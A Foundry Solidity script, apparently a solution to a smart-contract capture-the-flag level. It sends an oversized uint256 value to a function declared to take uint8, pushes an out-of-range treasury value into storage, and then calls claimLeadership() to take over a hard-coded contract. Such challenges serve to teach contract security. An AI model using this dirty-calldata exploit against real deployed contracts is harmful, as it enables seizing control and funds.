// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";

contract HigherOrderScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        address target = 0x7884C5c29a58c996aC395973Ba591478FBF9B8a9;

        (bool ok,) = target.call(abi.encodeWithSignature("registerTreasury(uint8)", type(uint256).max));
        if (!ok) {
            revert("Failed to call registerTreasury");
        }

        (ok,) = target.call(abi.encodeWithSignature("claimLeadership()"));
        if (!ok) {
            revert("Failed to call treasury");
        }

        (bool ok2, bytes memory data) = target.call(abi.encodeWithSignature("commander()"));
        if (!ok2) {
            revert("Failed to call commander");
        }

        address commander = abi.decode(data, (address));

        console.log("Commander: ", commander);

        vm.stopBroadcast();
    }
}
